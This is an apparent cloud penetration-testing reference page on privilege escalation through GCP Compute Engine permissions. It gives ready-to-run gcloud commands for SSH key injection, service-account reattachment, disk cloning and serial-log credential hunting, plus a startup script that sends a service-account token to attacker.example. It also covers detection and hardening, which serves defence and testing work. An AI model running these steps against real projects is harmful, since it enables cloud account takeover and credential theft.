---
cstg_id: CSTG-GCP-COMPUTE-ENGINE-PRIVESC
title: "GCP Compute Engine - Privilege Escalation"
provider: gcp
service: compute-engine
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - compute.instances.create
  - compute.instances.setMetadata
  - compute.projects.setCommonInstanceMetadata
  - compute.instances.setServiceAccount
  - compute.instances.osLogin
  - compute.instances.osAdminLogin
  - compute.instances.setIamPolicy
  - compute.instances.getSerialPortOutput
  - iam.serviceAccounts.actAs
  - compute.disks.create
  - compute.images.useReadOnly
tools: [gcloud, gcp-rest-api, GCPLoot, gcp_scanner, hashcat, jq]
references:
  - "https://cloud.google.com/iam/docs/service-accounts-actas"
  - "https://cloud.google.com/compute/docs/access/iam"
  - "https://cloud.google.com/compute/docs/metadata/setting-custom-metadata"
  - "https://cloud.google.com/compute/docs/connect/add-ssh-keys"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://cloud.google.com/compute/docs/oslogin"
license: CC BY-SA 4.0
---

## Summary

This page enumerates privilege-escalation paths in which Compute Engine permissions are abused to obtain higher privilege than the starting principal holds. The recurring theme is **service-account impersonation by proxy**: a GCE instance runs as a service account, and anyone who can run code on that instance - or attach that service account to a new instance - inherits its identity and IAM roles. Compute permissions are therefore an indirect grant of every role bound to every service account in the project.

Each escalation primitive below is presented as its own subsection keyed by the enabling permission. Most paths combine a Compute permission with `iam.serviceAccounts.actAs`, which is required to launch or reconfigure an instance to use a service account.

## Prerequisites

- An authenticated principal (assumed breach) holding one or more of the Compute permissions listed in the frontmatter.
- For most paths, `iam.serviceAccounts.actAs` on the target service account (or a role such as `roles/iam.serviceAccountUser` granting it).
- A target service account more privileged than the current principal - commonly the default Compute Engine service account with the project Editor role.

Identify targets first:

```bash
gcloud iam service-accounts list
gcloud projects get-iam-policy <PROJECT> --format=json   # map SA -> roles
gcloud compute instances list --format="value(serviceAccounts.email)" | sort -u
```

## Exploitation

### compute.instances.create (+ iam.serviceAccounts.actAs)

Create a new instance and attach a more-privileged service account with full scope. Code running on that instance can read the service account's token from the metadata server, yielding the SA's privileges.

```bash
gcloud compute instances create privesc-vm \
  --zone us-central1-a \
  --machine-type e2-small \
  --image-family debian-12 --image-project debian-cloud \
  --service-account <TARGET_SA>@<PROJECT>.iam.gserviceaccount.com \
  --scopes https://www.googleapis.com/auth/cloud-platform \
  --metadata startup-script='#!/bin/bash
    TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
    # exfiltrate $TOKEN to attacker-controlled endpoint
    curl -s -X POST https://attacker.example/collect -d "$TOKEN"'
```

The startup script runs as root at boot and harvests the attached SA's OAuth token without any interactive login.

### compute.instances.setMetadata / compute.projects.setCommonInstanceMetadata

Adding an SSH key to an instance's (or the project's) metadata grants login to instances that honor metadata keys (OS Login disabled). Logging in as a user with sudo on a VM whose attached SA is privileged yields that SA's token.

```bash
# Instance-level SSH key injection
ssh-keygen -t rsa -f ./privesc -C attacker -N ''
gcloud compute instances add-metadata <NAME> --zone <ZONE> \
  --metadata "ssh-keys=attacker:$(cat ./privesc.pub)"

# Project-wide key injection (affects all non-OS-Login instances)
gcloud compute project-info add-metadata \
  --metadata "ssh-keys=attacker:$(cat ./privesc.pub)"

ssh -i ./privesc attacker@<INSTANCE_EXTERNAL_IP>
# then, on the VM:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Setting a `startup-script` via metadata on a stopped instance, then starting it, achieves the same root code-execution without SSH.

### compute.instances.setServiceAccount (+ iam.serviceAccounts.actAs)

Reattach a more-privileged service account (or change scopes) on an existing, stopped instance you can run code on, then start it and read the new token.

```bash
gcloud compute instances stop <NAME> --zone <ZONE>
gcloud compute instances set-service-account <NAME> --zone <ZONE> \
  --service-account <TARGET_SA>@<PROJECT>.iam.gserviceaccount.com \
  --scopes cloud-platform
gcloud compute instances start <NAME> --zone <ZONE>
```

### compute.instances.osLogin / compute.instances.osAdminLogin

When OS Login is enabled, `osAdminLogin` grants sudo on the instance (plain `osLogin` grants non-privileged shell). Combined with appropriate IAM, this gives a root shell on an instance running a privileged SA, then token theft from metadata.

```bash
gcloud compute ssh <NAME> --zone <ZONE>          # uses OS Login
# on VM (with osAdminLogin -> sudo):
sudo curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### compute.instances.setIamPolicy

Grant yourself `roles/compute.instanceAdmin.v1` or an OS Login admin role directly on a target instance resource, then use any of the code-execution paths above against an instance whose SA is privileged.

```bash
gcloud compute instances set-iam-policy <NAME> --zone <ZONE> policy.json
```

### iam.serviceAccounts.actAs

This permission is the linchpin: it authorizes a principal to "act as" a service account when creating or modifying resources that run with that identity. Holding `actAs` on a privileged SA, plus any one of the create/setMetadata/setServiceAccount permissions above, completes an escalation. Without `actAs`, instance-creation calls that specify a service account are rejected.

### compute.disks.create / compute.images.useReadOnly

Create a disk from a snapshot or shared image of another, more-sensitive instance, attach it to an instance you control, and mount it to recover credentials, SSH keys, and application secrets stored on that disk.

```bash
gcloud compute disks create stolen-disk --zone <ZONE> --source-snapshot <SNAPSHOT>
gcloud compute instances attach-disk my-vm --disk stolen-disk --zone <ZONE>
# on my-vm: mount and harvest /home, /etc, app config, key material
```

### compute.instances.getSerialPortOutput

Read serial console output, which can contain bootstrapped credentials, tokens echoed by startup scripts, or cloud-init secrets - a no-code-execution path to credentials.

```bash
gcloud compute instances get-serial-port-output <NAME> --zone <ZONE> --port 1 | grep -iE 'token|password|secret|key'
```

## Misconfigurations & Findings

- Service accounts (especially the default Compute SA) bound to `roles/editor` or `roles/owner`, reachable via any instance-creation permission.
- Principals granted `roles/iam.serviceAccountUser` or `roles/compute.instanceAdmin.v1` broadly, effectively delegating those SAs' privileges.
- OS Login disabled, allowing metadata-based SSH key injection.
- Instances with `cloud-platform` scope where narrower scopes would suffice.
- Snapshots/images shared widely, enabling disk-mount credential theft.

## Detection & Logging

- **Cloud Audit Logs - Admin Activity** records the escalation primitives directly: `v1.compute.instances.insert` (create), `v1.compute.instances.setMetadata`, `v1.compute.projects.setCommonInstanceMetadata`, `v1.compute.instances.setServiceAccount`, and `v1.compute.instances.setIamPolicy`. Each entry includes the calling `principalEmail` and the targeted service account.
- Correlate an instance `insert`/`setServiceAccount` specifying a service account with a subsequent `generateAccessToken`-equivalent usage of that SA from a new source IP.
- `setCommonInstanceMetadata` adding `ssh-keys` is high-signal; alert on it.
- `getSerialPortOutput` by unusual principals indicates credential hunting.
- **Security Command Center** Event Threat Detection flags anomalous service-account behavior and self-granted IAM changes.

## Remediation & Hardening

- Apply least privilege to `iam.serviceAccountUser`/`actAs`; never grant it project-wide. Treat `actAs` as equivalent to granting all of the target SA's roles.
- Do not run instances as the default Compute SA; use dedicated least-privilege SAs and restrict scopes.
- Enforce OS Login org-wide and block project SSH keys (`enable-oslogin=true`, `block-project-ssh-keys=true`).
- Use IAM Conditions / VPC Service Controls to constrain where SAs can be used.
- Restrict `compute.instances.setMetadata`, `setServiceAccount`, and `setIamPolicy` to administrators; monitor and alert on their use.
- Limit snapshot/image sharing and disk creation permissions.

## Tools

- Cloud CLI and raw REST for executing each primitive.
- Privilege-escalation mappers (gcp_scanner, GCPLoot) for discovering which principals hold escalation permissions over which service accounts.
- Offline cracking tools for any recovered key material.

## References

- Service account actAs: https://cloud.google.com/iam/docs/service-accounts-actas
- Compute Engine IAM roles: https://cloud.google.com/compute/docs/access/iam
- Setting custom metadata: https://cloud.google.com/compute/docs/metadata/setting-custom-metadata
- Adding SSH keys: https://cloud.google.com/compute/docs/connect/add-ssh-keys
- GCP privilege escalation research: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- OS Login: https://cloud.google.com/compute/docs/oslogin
